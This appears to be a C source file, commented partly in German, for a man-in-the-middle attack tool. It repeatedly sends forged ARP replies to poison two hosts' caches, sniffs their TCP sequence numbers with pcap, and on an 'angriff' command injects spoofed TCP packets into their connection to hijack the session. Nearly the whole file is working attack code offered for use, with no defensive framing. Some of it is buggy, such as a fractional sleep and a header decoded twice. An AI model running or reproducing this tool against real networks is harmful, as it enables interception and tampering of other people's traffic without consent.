#include "header/arp.h"
#include "header/receive.h"
#include "header/hacking.h"

#include <pcap.h>
#include <libnet.h>
#include <pthread.h>

// Time between sending fake arp replies
#define ARP_POISON_FREQUENCY 6


struct target {
    uint32_t ip;
    uint8_t mac[6];
    struct libnet_ipv4_hdr iphdr;
    struct libnet_tcp_hdr tcphdr;
    uint32_t seq;
    uint32_t ack;
    uint16_t sport;
    uint16_t dport;
};

struct target target1;
struct target target2;
struct packet_node *head;

int sending_packet = 0;

libnet_t *libnet_arp_context;
pcap_t *handle;

void * arp_poison_thread(void *arg_ptr);
void * receive_packets_thread(void *arg_ptr);

void usage(char *name) {
    printf("Usage is: ./%s <IP Target1> <IP Target2>", name);
    exit(0);
}

int main(int argc, char *argv[]) 
{
     // Not enough arguments, show usage
    if(argc < 3) {
        usage(argv[0]);
    }

    // Pcap interface to retrieve network device
    pcap_if_t *ift;

    // Buffer to display errors
    u_char errbuf[LIBNET_ERRBUF_SIZE];

    // Thread IDs
    pthread_t thread_poison_id;
    pthread_t thread_receive_id;

    // Initialize libnet
    libnet_arp_context = libnet_init(LIBNET_LINK, NULL, errbuf);
    if(libnet_arp_context == NULL)
        libnet_fatal(libnet_geterror(libnet_arp_context));

    // Get device name
    if(pcap_findalldevs(&ift, (char *)(&errbuf)) == -1)
        fatal("suchen von Netzwerkgeräten");

     // Output the network interface which will be used
    printf("Netzwerkschnittstelle ist %s\n", ift->name);

     // Open device for live capture //
     handle = pcap_open_live(ift->name, BUFSIZ, 1, 1000, errbuf);
     if(handle == NULL)
        fatal("opening live session");

    /* fill Target details */

    // Convert Targets ASCII-IP's to Numbers
    if(((target1.ip = libnet_name2addr4(libnet_arp_context, argv[1], LIBNET_DONT_RESOLVE)) ==  -1) 
    || ((target2.ip = libnet_name2addr4(libnet_arp_context, argv[2], LIBNET_DONT_RESOLVE)) ==  -1)) {
        fatal(libnet_geterror(libnet_arp_context)); 
    }
    
    // Request Target 1's mac
    arp_request(target1.ip, libnet_arp_context);


    // Receive Target 1's mac
    printf("\n%s: sende und suche ARP-Pakete... \n", argv[1]);
    while(arp_receive(handle, target1.ip, target1.mac) != 0) {
        sleep(0.1);   
        arp_request(target1.ip, libnet_arp_context);
    }

    printf("-------------------------------\n");
    printf("%s: sende und suche ARP-Pakete... \n", argv[2]);

    // Request Target 2's mac
    arp_request(target2.ip, libnet_arp_context);

    // Receive Target 2's mac
    while(arp_receive(handle, target2.ip, target2.mac) != 0) {
        sleep(0.1);
        arp_request(target2.ip, libnet_arp_context);
    }

    /* Start ARP-Poisoning on different thread */
    pthread_create(&thread_poison_id, NULL, arp_poison_thread, NULL);
    
    /* Start receiving packets on different thread*/

    pthread_create(&thread_receive_id, NULL, receive_packets_thread, NULL);

    libnet_t *context = libnet_init(LIBNET_RAW4, NULL, errbuf);
        if ( context == NULL ) {
            fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
            exit(EXIT_FAILURE);
        }
    
    libnet_ptag_t ip_tag = 0;
    libnet_ptag_t tcp_tag = 0;
    while(1) 
    {
        // Do something
        char message[20];
        fgets(message, 19, stdin);
        printf("[DEBUG] Nachricht ist %s\n", message);


        // If the user enters verbindung, show him the saved headers for target 1 and 2
        if(strstr(message, "verbindung")) 
        {
            printf("TARGET #1\n");
            decode_ip(&target1.iphdr);
            decode_tcp(&target1.tcphdr);

            printf("TARGET #2\n");
            decode_ip(&target1.iphdr);
            decode_tcp(&target2.tcphdr);

        }

        if(strstr(message, "angriff"))
        {

            while(1) {

                sleep(1);
            
            // nicht gerade ein schöner "hack", davor gab nach 2-3 mal senden einen Crash
            pthread_cancel(thread_receive_id);


            u_char str[] = "abc";
            // Nachricht von eins zu zwei (später funktion bitte)
            tcp_tag = libnet_build_tcp (
                        ntohs(target1.sport),               /* src port */
                        ntohs(target1.dport),               /* destination port */
                        ntohl(target2.ack),                 /* sequence number */
                        ntohl(target2.seq),                 /* acknowledgement */
                        TH_PUSH | TH_ACK,                   /* control flags */
                        7,                                  /* window */
                        0,                                  /* checksum - 0 = autofill */
                        0,                                  /* urgent */
                        LIBNET_TCP_H,                       /* header length */
                        str,                                /* payload */
                        4,                                  /* payload length */
                        context,                            /* libnet context */
                        tcp_tag);                                 /* protocol tag */




            ip_tag = libnet_build_ipv4 (LIBNET_TCP_H + LIBNET_IPV4_H,    /* length */
                            0,                                  /* TOS */
                            libnet_get_prand (LIBNET_PRu16),    /* IP ID */
                            0,                                  /* frag offset */
                            127,                                /* TTL */
                            IPPROTO_TCP,                        /* upper layer protocol */
                            0,                                  /* checksum, 0=autofill */
                            target1.iphdr.ip_src.s_addr,        /* src IP */
                            target1.iphdr.ip_dst.s_addr,        /* dest IP */
                            NULL,                               /* payload */
                            0,                                  /* payload len */
                            context,                            /* libnet context */
                            ip_tag);                                 /* protocol tag */

            libnet_write(context);
            
            //libnet_clear_packet(context);
            pthread_create(&thread_receive_id, NULL, receive_packets_thread, NULL);
            }
        }
    }

}

void * arp_poison_thread(void *arg_ptr)
{
    while(1) 
    {
        //send a fake arp-reply to target 1 pretending to be target 2
        arp_reply(target2.ip, target1.ip, target1.mac, libnet_arp_context);
        //send a fake arp-reply to target 2 pretending to be target 1
        arp_reply(target1.ip, target2.ip, target2.mac, libnet_arp_context);
        sleep(ARP_POISON_FREQUENCY);
    }
}

void set_packet_filter(pcap_t *handle1, char *filter_opt)
{
    struct bpf_program filter;
    char filter_string[200];
    strncpy(filter_string, filter_opt, 200);
    printf("[DEBUG] filter string ist %s\n", filter_string);

    if(pcap_compile(handle1, &filter, filter_string, 0, 0) == -1)
    {
        perror("compile filter error");
        exit(1);
    }

    if(pcap_setfilter(handle1, &filter) == -1)
    {
        perror("setting filter error");
        exit(1);
    }

}

void receive_packets(u_char *args, const struct pcap_pkthdr *header,
    const u_char *packet) 
{

    struct libnet_ipv4_hdr *iphdr = (struct libnet_ipv4_hdr *)(packet + LIBNET_ETH_H);
    struct libnet_tcp_hdr *tcphdr = (struct libnet_tcp_hdr *)(packet + LIBNET_ETH_H + LIBNET_IPV4_H);
        
    // Schauen ob das Paket schon einmal empfangen wurde
    if(search_packets(head, tcphdr->th_seq, tcphdr->th_ack))
        return;

    // Wenn nicht dann neben wir es in unsere Liste auf
    push_packet_node(head, tcphdr->th_seq, tcphdr->th_ack);
    


    // Paket kam vom 1. Ziel
    if(iphdr->ip_src.s_addr == target1.ip) 
    {
        target1.seq   = tcphdr->th_seq;
        target1.ack   = tcphdr->th_ack;
        target1.sport = tcphdr->th_sport;
        target1.dport = tcphdr->th_dport;

        memcpy(&target1.iphdr, iphdr, sizeof(struct libnet_ipv4_hdr));
        memcpy(&target1.tcphdr, tcphdr, sizeof(struct libnet_tcp_hdr));
    }

    // Paket kam vom 2. Ziel
    if(iphdr->ip_src.s_addr == target2.ip) 
    {
        target2.seq   = tcphdr->th_seq;
        target2.ack   = tcphdr->th_ack;
        target2.sport = tcphdr->th_sport;
        target2.dport = tcphdr->th_dport;

        memcpy(&target2.iphdr, iphdr, sizeof(struct libnet_ipv4_hdr));
        memcpy(&target2.tcphdr, tcphdr, sizeof(struct libnet_tcp_hdr));
    }

    printf("Seq #: %u Ack #: %u\n", ntohl(tcphdr->th_seq), ntohl(tcphdr->th_ack));
}

void * receive_packets_thread(void *arg_ptr)
{
    // Liste vorbereiten
    head = ec_malloc(sizeof(struct packet_node));
    head->next_packet_node = NULL;
    head->seq = 0;
    head->ack = 0;

    printf("THREAD ENTERNET\n");

    set_packet_filter(handle, "tcp");

    pcap_loop(handle, -1, receive_packets, NULL);
}